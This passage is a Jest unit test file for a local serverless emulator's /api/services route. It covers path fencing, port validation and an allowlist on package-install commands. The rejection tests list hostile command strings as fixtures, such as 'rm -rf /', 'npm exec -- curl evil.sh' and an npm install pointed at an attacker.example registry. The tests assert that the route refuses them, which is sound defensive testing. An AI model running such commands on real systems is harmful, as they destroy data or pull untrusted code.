// Unit test for the /api/services route. Mounts the router on a throwaway
// Express app and drives it with supertest. The registration flow itself lives
// in ServiceRegistrar (integration-tested, coverage-excluded), so it is
// jest.mocked here together with the runtime/gateway/watcher singletons (the
// real modules fork workers / bind ports / use import.meta). The route's own
// responsibilities — validation, RegistrationError → status mapping, response
// shaping — are what this file covers. CacheManager / ProcessManager are spied
// on their prototypes/instances as before.
import express from 'express';
import request from 'supertest';
import path from 'path';

jest.mock('../../../src/server/services/service-registrar', () => {
  class RegistrationError extends Error {
    statusCode: number;
    constructor(statusCode: number, message: string) {
      super(message);
      this.name = 'RegistrationError';
      this.statusCode = statusCode;
    }
  }
  const instance = { register: jest.fn(), activate: jest.fn(), deactivate: jest.fn() };
  return { ServiceRegistrar: { getInstance: () => instance }, RegistrationError };
});
jest.mock('../../../src/server/services/lambda-runtime-manager', () => {
  const instance = { getRuntimeInfo: jest.fn(), stopRuntime: jest.fn() };
  return { LambdaRuntimeManager: { getInstance: () => instance } };
});
jest.mock('../../../src/server/services/gateway-manager', () => {
  const instance = { getInfo: jest.fn(), stopService: jest.fn() };
  return { GatewayManager: { getInstance: () => instance } };
});
jest.mock('../../../src/server/services/source-watcher', () => {
  const instance = { getStatus: jest.fn(), unwatch: jest.fn() };
  return { SourceWatcher: { getInstance: () => instance } };
});

jest.mock('../../../src/server/services/service-scanner', () => ({
  scanForServices: jest.fn(),
}));

// The install/package endpoints spawn real processes through the packager —
// mock the runner, keep the real error class so `instanceof` still matches.
jest.mock('../../../src/server/services/serverless-packager', () => ({
  ...jest.requireActual('../../../src/server/services/serverless-packager'),
  runServerlessPackage: jest.fn(),
}));

import fs from 'fs';
import os from 'os';
import http from 'http';
import { once } from 'events';
import type { AddressInfo } from 'net';
import { servicesRouter, processManager } from '../../../src/server/routes/services';
import { getBindHost, isLoopbackBind } from '../../../src/server/services/bind-host';
import { startDynamoProxy } from '../../../src/server/dev/dynamo-proxy';
import { SelfEngineBackend } from '../../../src/server/engine/backends/self-backend';
import type { ServiceEntry } from '../../../src/server/services/function-registry';
import { runServerlessPackage, ServerlessPackageError } from '../../../src/server/services/serverless-packager';
import { scanForServices } from '../../../src/server/services/service-scanner';
import { CacheManager } from '../../../src/server/services/cache-manager';
import { ResourceProvisioner } from '../../../src/server/services/resource-provisioner';
import { ConfigManager } from '../../../src/server/services/config-manager';
import { ServiceRegistrar, RegistrationError } from '../../../src/server/services/service-registrar';
import { LambdaRuntimeManager } from '../../../src/server/services/lambda-runtime-manager';
import { GatewayManager } from '../../../src/server/services/gateway-manager';
import { SourceWatcher } from '../../../src/server/services/source-watcher';

const registrar = ServiceRegistrar.getInstance() as jest.Mocked<ServiceRegistrar>;
const runtime = LambdaRuntimeManager.getInstance() as jest.Mocked<LambdaRuntimeManager>;
const gateway = GatewayManager.getInstance() as jest.Mocked<GatewayManager>;
const watcher = SourceWatcher.getInstance() as jest.Mocked<SourceWatcher>;

function appWith() {
  const app = express();
  app.use(express.json());
  app.use('/api/services', servicesRouter);
  return app;
}

// Same router but WITHOUT a body parser, so req.body is undefined and the
// `req.body || {}` fallback in POST /:name/start is exercised.
function appNoBodyParser() {
  const app = express();
  app.use('/api/services', servicesRouter);
  return app;
}

// A minimal valid CloudFormation template with one of each resource type so
// the resourceBreakdown / resourcesCount fields are exercised.
const TEMPLATE = {
  Resources: {
    MyFn: { Type: 'AWS::Lambda::Function', Properties: { FunctionName: 'my-fn', Handler: 'h', Runtime: 'nodejs20.x' } },
    MyTable: { Type: 'AWS::DynamoDB::Table', Properties: { TableName: 'my-table' } },
    MyQueue: { Type: 'AWS::SQS::Queue', Properties: { QueueName: 'my-queue' } },
    MyTopic: { Type: 'AWS::SNS::Topic', Properties: { TopicName: 'my-topic' } },
    MyBucket: { Type: 'AWS::S3::Bucket', Properties: { BucketName: 'my-bucket' } },
    MyCollection: { Type: 'AWS::OpenSearchServerless::Collection', Properties: { Name: 'my-collection' } },
    MyMapping: {
      Type: 'AWS::Lambda::EventSourceMapping',
      Properties: { FunctionName: 'my-fn', EventSourceArn: 'arn:queue' },
    },
  },
};

const META = {
  name: 'my-service',
  root: '/abs/my-service',
  templateHash: 'abc',
  lastUpdated: 1,
  status: 'registered' as const,
};

const REGISTER_RESULT = {
  serviceName: 'my-service',
  resources: [
    { type: 'lambda', name: 'my-fn' },
    // An event-source resource exposes functionName instead of name, exercising
    // the `'name' in r ? r.name : r.functionName` fallback arm.
    { type: 'event-source', functionName: 'my-fn' },
  ],
  functionsCount: 1,
  routesCount: 2,
  warnings: ['w1'],
} as never;

beforeEach(() => {
  jest.restoreAllMocks();

  registrar.register.mockReset().mockResolvedValue(REGISTER_RESULT);
  registrar.activate.mockReset().mockResolvedValue(undefined);
  registrar.deactivate.mockReset().mockResolvedValue(undefined);
  runtime.getRuntimeInfo.mockReset().mockReturnValue({ status: 'online', invocations: 0, errors: 0 } as never);
  runtime.stopRuntime.mockReset().mockResolvedValue(undefined);
  gateway.getInfo.mockReset().mockReturnValue({
    api: { port: 3001, status: 'online' },
    invoke: { port: 13001, status: 'online' },
  } as never);
  gateway.stopService.mockReset().mockResolvedValue(undefined);
  watcher.getStatus.mockReset().mockReturnValue({ watching: true, lastReloadKind: 'runtime' } as never);
  watcher.unwatch.mockReset();

  // Stable defaults for the provisioner and cache so each handler can run.
  const prov = ResourceProvisioner.getInstance();
  jest.spyOn(prov, 'cleanupResources').mockResolvedValue(undefined as never);

  jest.spyOn(CacheManager.prototype, 'init').mockResolvedValue(undefined);
  jest.spyOn(CacheManager.prototype, 'updateMetadata').mockResolvedValue(undefined);
  jest.spyOn(CacheManager.prototype, 'deleteService').mockResolvedValue(undefined);

  const cm = ConfigManager.getInstance();
  jest.spyOn(cm, 'getConfig').mockReturnValue({ region: undefined } as never);
  jest.spyOn(cm, 'getRuntimeConfigForService').mockReturnValue({
    enabled: true, execution: 'auto', watch: undefined, apiPort: undefined, invokePort: undefined,
  } as never);
  jest.spyOn(cm, 'getPackageConfigForService').mockReturnValue({
    command: 'npx serverless package', args: [], env: {}, timeoutMs: 300000,
  } as never);
  (runServerlessPackage as jest.Mock).mockReset().mockResolvedValue({ exitCode: 0, stdout: 'done', stderr: '' });
});

describe('POST /api/services/register', () => {
  it('400 when servicePath is missing', async () => {
    const res = await request(appWith()).post('/api/services/register').send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('servicePath is required');
    expect(registrar.register).not.toHaveBeenCalled();
  });

  it('400 when resolved path still contains traversal segments', async () => {
    // path.resolve normally collapses '..', so force a resolved path that still
    // contains '..' to exercise the first operand of the validation OR.
    jest.spyOn(path, 'resolve').mockReturnValue('/abs/../etc');
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/../etc' });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid service path');
  });

  it('400 when resolved path is not absolute', async () => {
    // Force a non-absolute resolved path to exercise the second operand.
    jest.spyOn(path, 'resolve').mockReturnValue('relative/path');
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: 'relative/path' });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid service path');
  });

  it('400 on invalid invokePort (below range)', async () => {
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/svc', invokePort: 80 });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid invokePort, must be between 1024-65535');
  });

  it('400 on invalid apiPort (above range)', async () => {
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/svc', apiPort: 70000 });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid apiPort, must be between 1024-65535');
  });

  it('400 on a non-numeric port', async () => {
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/svc', invokePort: '3001' });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid invokePort, must be between 1024-65535');
  });

  it('delegates to ServiceRegistrar and returns counts, warnings and resources', async () => {
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service', invokePort: 13001, apiPort: 3001, region: 'eu-west-1' });
    expect(res.status).toBe(200);
    expect(registrar.register).toHaveBeenCalledWith({
      servicePath: '/abs/my-service',
      invokePort: 13001,
      apiPort: 3001,
      region: 'eu-west-1',
    });
    expect(res.body).toEqual({
      success: true,
      serviceName: 'my-service',
      resourcesCount: 2,
      functionsCount: 1,
      routesCount: 2,
      warnings: ['w1'],
      resources: [
        { type: 'lambda', name: 'my-fn' },
        { type: 'event-source', name: 'my-fn' },
      ],
    });
  });

  it('logs the lss.config.json region when the request omits region', async () => {
    (ConfigManager.getInstance().getConfig as jest.Mock).mockReturnValue({ region: 'ap-south-1' });
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(200);
    // The registrar still receives the request's (undefined) region and applies
    // its own precedence; the route only logs the effective source.
    expect(registrar.register).toHaveBeenCalledWith(
      expect.objectContaining({ region: undefined }),
    );
  });

  it('falls back to the default region when none configured', async () => {
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(200);
  });

  it('maps a RegistrationError to its statusCode (400)', async () => {
    registrar.register.mockRejectedValue(new RegistrationError(400, 'CloudFormation template not found at /x'));
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain('CloudFormation template not found');
  });

  it('maps a RegistrationError to its statusCode (500, auto-package failure)', async () => {
    registrar.register.mockRejectedValue(new RegistrationError(500, 'Auto-package failed for /abs/my-service: exit 1'));
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(500);
    expect(res.body.error).toContain('Auto-package failed');
  });

  it('500 with the message for an unexpected Error', async () => {
    registrar.register.mockRejectedValue(new Error('EACCES boom'));
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('EACCES boom');
  });

  it('500 with "Unknown error" when a non-Error is thrown', async () => {
    registrar.register.mockRejectedValue('boom');
    const res = await request(appWith())
      .post('/api/services/register')
      .send({ servicePath: '/abs/my-service' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Unknown error');
  });
});

describe('GET /api/services', () => {
  it('lists services with resource breakdown, counts, runtime and gateway status', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([
      {
        ...META,
        functions: [{ name: 'f1' }, { name: 'f2' }],
        routes: [{ path: '/x' }],
      } as never,
    ]);
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(TEMPLATE);
    const res = await request(appWith()).get('/api/services');
    expect(res.status).toBe(200);
    expect(res.body[0].resourcesCount).toBe(7);
    expect(res.body[0].resourceBreakdown).toEqual({
      lambdas: 1, tables: 1, queues: 1, topics: 1, buckets: 1, buses: 0, eventRules: 0, collections: 1,
    });
    expect(res.body[0].functionsCount).toBe(2);
    expect(res.body[0].routesCount).toBe(1);
    expect(res.body[0].runtimeStatus).toBe('online');
    expect(res.body[0].gateway).toEqual({
      api: { port: 3001, status: 'online' },
      invoke: { port: 13001, status: 'online' },
    });
  });

  it('defaults functions/routes counts to 0 for legacy metadata without them', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([{ ...META }]);
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(null);
    const res = await request(appWith()).get('/api/services');
    expect(res.status).toBe(200);
    expect(res.body[0].resourcesCount).toBe(0);
    expect(res.body[0].functionsCount).toBe(0);
    expect(res.body[0].routesCount).toBe(0);
  });

  it('500 when listing fails', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockRejectedValue(new Error('disk'));
    const res = await request(appWith()).get('/api/services');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to list services');
  });
});

// The discovery endpoint behind onboarding and `lss scan`. Its route must sit
// BEFORE /:name — "scan" would otherwise match as a service name.
describe('GET /api/services/scan', () => {
  it('scans the project root against the registered roots', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([
      { ...META, root: '/abs/registered-svc' } as never,
    ]);
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    (scanForServices as jest.Mock).mockReturnValue([
      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false, apiPort: 3631 },
    ]);
    const res = await request(appWith()).get('/api/services/scan');
    expect(res.status).toBe(200);
    expect(res.body).toEqual({
      projectRoot: '/abs',
      services: [{
        name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false,
        // yml hint survives (no serviceRuntime override), invokePort stays
        // unset, and the effective package command is attached for onboarding.
        apiPort: 3631,
        packageCommand: 'npx serverless package',
      }],
    });
    expect(scanForServices).toHaveBeenCalledWith('/abs', ['/abs/registered-svc'], {
      isIgnored: expect.any(Function),
      autoPackage: false,
    });
    // The predicate must be wired to the config, not just present: a scanIgnore
    // that is never consulted is the same as no scanIgnore at all.
    const ignoreSpy = jest.spyOn(ConfigManager.getInstance(), 'isScanIgnored').mockReturnValue(true);
    const { isIgnored } = (scanForServices as jest.Mock).mock.calls[0][2];
    expect(isIgnored('/abs/infra/global')).toBe(true);
    expect(ignoreSpy).toHaveBeenCalledWith('/abs/infra/global');
  });

  // What the scan can only guess from a yml scrape, the packaged state has
  // already settled for a registered service — so the cached metadata wins.
  it('overlays hasFunctions/routeCount from the cache for a registered service', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([
      { ...META, root: '/abs/orders', functions: [{ name: 'a' }], routes: [{ method: 'GET' }, { method: 'POST' }] } as never,
      { ...META, root: '/abs/shared', functions: [], routes: [] } as never,
      // Cached before functions/routes were recorded: absent, not empty.
      { ...META, root: '/abs/legacy', functions: undefined, routes: undefined } as never,
    ]);
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    (scanForServices as jest.Mock).mockReturnValue([
      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: true, hasFunctions: undefined },
      { name: 'shared', root: '/abs/shared', relPath: 'shared', registered: true, hasFunctions: true },
      { name: 'legacy', root: '/abs/legacy', relPath: 'legacy', registered: true, hasFunctions: true },
      { name: 'new', root: '/abs/new', relPath: 'new', registered: false, hasFunctions: false },
    ]);
    const res = await request(appWith()).get('/api/services/scan');
    expect(res.body.services.map((s: any) => [s.name, s.hasFunctions, s.routeCount])).toEqual([
      ['orders', true, 2],
      ['shared', false, 0],
      ['legacy', false, undefined],
      // Never registered: the scan's own hint is all there is.
      ['new', false, undefined],
    ]);
  });

  it('serviceRuntime ports from the config override the yml hints', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockResolvedValue([]);
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    (ConfigManager.getInstance().getRuntimeConfigForService as jest.Mock).mockReturnValue({
      enabled: true, execution: 'auto', watch: undefined, apiPort: 4001, invokePort: 14001,
    });
    (ConfigManager.getInstance().getPackageConfigForService as jest.Mock).mockReturnValue({
      command: 'npm run package:custom', args: [], env: {}, timeoutMs: 300000,
    });
    (scanForServices as jest.Mock).mockReturnValue([
      { name: 'orders', root: '/abs/orders', relPath: 'orders', registered: false, apiPort: 3631, invokePort: 13631 },
    ]);
    const res = await request(appWith()).get('/api/services/scan');
    expect(res.status).toBe(200);
    expect(res.body.services[0]).toMatchObject({
      apiPort: 4001,
      invokePort: 14001,
      packageCommand: 'npm run package:custom',
    });
  });

  it('500 when the scan fails', async () => {
    jest.spyOn(CacheManager.prototype, 'listServices').mockRejectedValue(new Error('disk'));
    const res = await request(appWith()).get('/api/services/scan');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to scan for services');
  });
});

// The preparation endpoints behind onboarding's "install/package selected"
// buttons. They run host commands, so validation (path exists, first-token
// whitelist) and honest failure payloads (exit code + output tail) are the
// route's whole job — the runner itself is the packager, tested elsewhere.
describe('POST /api/services/install and /package', () => {
  // The fence resolves symlinks before comparing, so every test that expects to
  // get past it has to say what realpathSync returns. Identity = "no symlinks
  // anywhere", the shape of a normal checkout.
  function noSymlinks() {
    jest.spyOn(fs, 'realpathSync').mockImplementation(((p: string) => p) as never);
  }

  // The endpoints confine servicePath to the project root, so every happy-path
  // test needs a root the fixture path sits under.
  function dirExists() {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    noSymlinks();
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
  }

  it.each(['install', 'package'])('%s: 400 when servicePath is missing or not a string', async (ep) => {
    for (const body of [{}, { servicePath: 7 }]) {
      const res = await request(appWith()).post(`/api/services/${ep}`).send(body);
      expect(res.status).toBe(400);
      expect(res.body.error).toBe('servicePath is required');
    }
  });

  it.each(['install', 'package'])('%s: 400 when the directory does not exist', async (ep) => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    jest.spyOn(fs, 'realpathSync').mockImplementation(((p: string) => {
      // The root resolves; the candidate does not exist, and a path that cannot
      // be resolved is never a service directory.
      if (p === '/abs') return p;
      throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
    }) as never);
    const res = await request(appWith()).post(`/api/services/${ep}`).send({ servicePath: '/abs/ghost' });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain('Not a directory');
  });

  it.each(['install', 'package'])('%s: 400 when stat throws after the path resolved', async (ep) => {
    dirExists();
    jest.spyOn(fs, 'statSync').mockImplementation((() => {
      // realpathSync + statSync are two syscalls and the directory can vanish
      // (or become unreadable) between them; a throwing stat must answer 400,
      // not become an unhandled rejection that kills the orchestrator.
      throw Object.assign(new Error('EACCES'), { code: 'EACCES' });
    }) as never);
    const res = await request(appWith()).post(`/api/services/${ep}`).send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain('Not a directory');
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  it.each(['install', 'package'])('%s: 400 when the path escapes the project root', async (ep) => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs/project');
    noSymlinks();
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
    for (const outside of ['/etc', '/abs/other-project/svc']) {
      const res = await request(appWith()).post(`/api/services/${ep}`).send({ servicePath: outside });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('must be inside the project root');
    }
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  // The fence used to be lexical: `path.relative(root, resolved)` only looks at
  // the string, so a symlink checked into the project and pointing outside it
  // passed — and stat/spawn then followed it. The comparison is on the resolved
  // path now, so the link is what gets rejected.
  it.each(['install', 'package'])('%s: 400 when a symlink inside the root resolves outside it', async (ep) => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs/project');
    jest.spyOn(fs, 'realpathSync').mockImplementation(((p: string) => (
      p === '/abs/project/orders' ? '/etc' : p
    )) as never);
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
    const res = await request(appWith()).post(`/api/services/${ep}`)
      .send({ servicePath: '/abs/project/orders' });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain('must be inside the project root');
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  // A checkout reached through a symlink resolves to its real location, and the
  // real location is what runs — so the runner is given the resolved directory.
  it('install: runs in the resolved directory when the service dir is a symlink', async () => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    jest.spyOn(fs, 'realpathSync').mockImplementation(((p: string) => (
      p === '/abs/orders' ? '/abs/packages/orders' : p
    )) as never);
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(200);
    expect(runServerlessPackage).toHaveBeenCalledWith(
      expect.objectContaining({ cwd: '/abs/packages/orders' }),
    );
  });

  // A project root that cannot be resolved is a misconfiguration, not a caller
  // error: it keeps its lexical form so the fence still answers honestly.
  it('install: falls back to the lexical project root when the root cannot be resolved', async () => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    jest.spyOn(fs, 'realpathSync').mockImplementation(((p: string) => {
      if (p === '/abs') throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
      return p;
    }) as never);
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => true } as never);
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(200);
    expect(runServerlessPackage).toHaveBeenCalledWith(
      expect.objectContaining({ cwd: '/abs/orders' }),
    );
  });

  it('400 when the resolved path still contains traversal segments or is not absolute', async () => {
    // path.resolve normally collapses '..' — force both invalid shapes, same
    // pattern the /register validation tests use.
    for (const forced of ['/abs/../etc', 'relative/path']) {
      jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
      jest.spyOn(path, 'resolve').mockReturnValue(forced);
      const res = await request(appWith()).post('/api/services/install').send({ servicePath: forced });
      expect(res.status).toBe(400);
      expect(res.body.error).toBe('Invalid service path');
      jest.restoreAllMocks();
    }
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  it('install: 400 when the path is a file, without running anything', async () => {
    jest.spyOn(ConfigManager.getInstance(), 'getProjectRoot').mockReturnValue('/abs');
    noSymlinks();
    jest.spyOn(fs, 'statSync').mockReturnValue({ isDirectory: () => false } as never);
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/serverless.yml' });
    expect(res.status).toBe(400);
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  it('install: runs `npm install` in the service dir by default', async () => {
    dirExists();
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, exitCode: 0, output: 'done' });
    expect(typeof res.body.durationMs).toBe('number');
    expect(runServerlessPackage).toHaveBeenCalledWith({
      command: 'npm install', cwd: '/abs/orders', timeoutMs: 300000,
    });
  });

  it.each([
    '  yarn install --frozen-lockfile  ',
    'npm ci',
    'pnpm i --prefer-offline',
    // A bare `yarn`/`pnpm` installs; only npm needs the subcommand.
    'yarn',
    'pnpm',
    // Every allowlisted flag spelling: bare booleans, the `--flag=value` forms
    // and their bare counterparts.
    'npm install --production --no-audit --no-fund --legacy-peer-deps',
    'npm install --omit=dev --omit=optional --include=dev --include=optional',
    'npm install --loglevel=silly --silent --quiet --force --offline',
    'npm install --omit --include --loglevel',
    'yarn install --immutable --no-frozen-lockfile',
  ])('install: accepts the install shape %p', async (command) => {
    dirExists();
    const res = await request(appWith()).post('/api/services/install')
      .send({ servicePath: '/abs/orders', command });
    expect(res.status).toBe(200);
    expect(runServerlessPackage).toHaveBeenCalledWith(
      expect.objectContaining({ command: command.trim() }),
    );
  });

  // The whitelist is on the command's SHAPE, not just its first token: every
  // runner here can execute arbitrary code when given the right subcommand, and
  // the endpoint answers with the output, so a first-token check alone would
  // make this an execution + exfiltration primitive for anything that can reach
  // the port (the server binds all interfaces with permissive CORS).
  //
  // The flags are an allowlist for the same reason: `--registry` moves where
  // the installed code comes from, `--prefix`/`--cwd`/`--dir` move where it
  // lands (defeating the project-root fence), `--userconfig` replaces the whole
  // npmrc. A "starts with a dash" check accepted all four.
  it.each([
    ['rm -rf /', 'must start with one of'],
    ['node -e "require(\'fs\')"', 'must start with one of'],
    ['npx some-package', 'must start with one of'],
    ['npm exec -- curl evil.sh', 'subcommand must be one of'],
    ['npm run build', 'subcommand must be one of'],
    ['npm', 'npm needs an install subcommand'],
    ['npm install evil-package', 'unexpected argument "evil-package"'],
    ['yarn add evil-package', 'unexpected argument "evil-package"'],
    ['npm install --registry=http://attacker.example', 'flag not permitted: "--registry"'],
    ['npm install --userconfig=/tmp/evil.npmrc', 'flag not permitted: "--userconfig"'],
    ['npm install --prefix=/tmp/anywhere', 'flag not permitted: "--prefix"'],
    ['yarn install --cwd=/etc', 'flag not permitted: "--cwd"'],
    ['pnpm install --dir=/etc', 'flag not permitted: "--dir"'],
    // A value-carrying spelling of a boolean flag is not the allowlisted token.
    ['npm install --force=please', 'flag not permitted: "--force"'],
    // Short flags are '-'-prefixed too, and are equally not on the list.
    ['npm install -g', 'flag not permitted: "-g"'],
    // The value of a space-separated flag reads as a positional, so only the
    // `--flag=value` spelling gets through.
    ['npm install --omit dev', 'unexpected argument "dev"'],
    ['yarn add --dev evil-package', 'flag not permitted: "--dev"'],
  ])('install: rejects %p', async (command, expected) => {
    dirExists();
    const res = await request(appWith()).post('/api/services/install')
      .send({ servicePath: '/abs/orders', command });
    expect(res.status).toBe(400);
    expect(res.body.error).toContain(expected);
    expect(runServerlessPackage).not.toHaveBeenCalled();
  });

  it('install: 422 with the output tail when the command fails', async () => {
    dirExists();
    (runServerlessPackage as jest.Mock).mockRejectedValue(new ServerlessPackageError(
      'Package command "npm install" exited with code 1',
      { exitCode: 1, stdout: 'partial', stderr: 'EACCES' },
    ));
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(422);
    expect(res.body).toMatchObject({ exitCode: 1, output: 'partial\nEACCES' });
    expect(res.body.error).toContain('exited with code 1');
  });

  it('install: 500 on an unexpected error (Error and non-Error shapes)', async () => {
    dirExists();
    (runServerlessPackage as jest.Mock).mockRejectedValue(new Error('spawn EMFILE'));
    let res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('spawn EMFILE');

    (runServerlessPackage as jest.Mock).mockRejectedValue('boom');
    res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Unknown error');
  });

  it('package: runs the effective package command with its args/env/timeout', async () => {
    dirExists();
    (ConfigManager.getInstance().getPackageConfigForService as jest.Mock).mockReturnValue({
      command: 'npm run package:custom', args: ['--stage', 'local'], env: { SLS_DEBUG: '1' }, timeoutMs: 60000,
      cwd: '/abs/orders',
    });
    const res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ success: true, exitCode: 0 });
    expect(runServerlessPackage).toHaveBeenCalledWith({
      command: 'npm run package:custom',
      args: ['--stage', 'local'],
      env: { SLS_DEBUG: '1' },
      cwd: '/abs/orders',
      timeoutMs: 60000,
    });
  });

  it('package: 422 with the output tail when packaging fails', async () => {
    dirExists();
    (runServerlessPackage as jest.Mock).mockRejectedValue(new ServerlessPackageError(
      'Package command "npx serverless package" exited with code 2',
      { exitCode: 2, stdout: '', stderr: 'Cannot resolve variable' },
    ));
    const res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(422);
    expect(res.body).toMatchObject({ exitCode: 2, output: 'Cannot resolve variable' });
  });

  it('package: 500 on an unexpected error (Error and non-Error shapes)', async () => {
    dirExists();
    (runServerlessPackage as jest.Mock).mockRejectedValue('boom');
    let res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Unknown error');

    (runServerlessPackage as jest.Mock).mockRejectedValue(new Error('spawn EMFILE'));
    res = await request(appWith()).post('/api/services/package').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('spawn EMFILE');
  });

  it('caps a huge output at the tail', async () => {
    dirExists();
    (runServerlessPackage as jest.Mock).mockResolvedValue({
      exitCode: 0, stdout: 'x'.repeat(9000), stderr: 'end-marker',
    });
    const res = await request(appWith()).post('/api/services/install').send({ servicePath: '/abs/orders' });
    expect(res.status).toBe(200);
    expect(res.body.output.length).toBeLessThanOrEqual(8001);
    expect(res.body.output.startsWith('…')).toBe(true);
    expect(res.body.output.endsWith('end-marker')).toBe(true);
  });
});

describe('GET /api/services/:name', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).get('/api/services/a..b');
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid service name');
  });

  it('404 when metadata missing', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue(null);
    const res = await request(appWith()).get('/api/services/my-service');
    expect(res.status).toBe(404);
    expect(res.body.error).toBe('Service not found');
  });

  it('200 returns service details', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(TEMPLATE);
    const res = await request(appWith()).get('/api/services/my-service');
    expect(res.status).toBe(200);
    expect(res.body.resourcesCount).toBe(7);
    expect(res.body.name).toBe('my-service');
  });

  it('500 when fetch throws', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockRejectedValue(new Error('x'));
    const res = await request(appWith()).get('/api/services/my-service');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to fetch service details');
  });
});

describe('DELETE /api/services/:name', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).delete('/api/services/a..b');
    expect(res.status).toBe(400);
  });

  it('200 deactivates the data plane, cleans up resources and deletes the cache', async () => {
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(TEMPLATE);
    const res = await request(appWith()).delete('/api/services/my-service');
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(registrar.deactivate).toHaveBeenCalledWith('my-service');
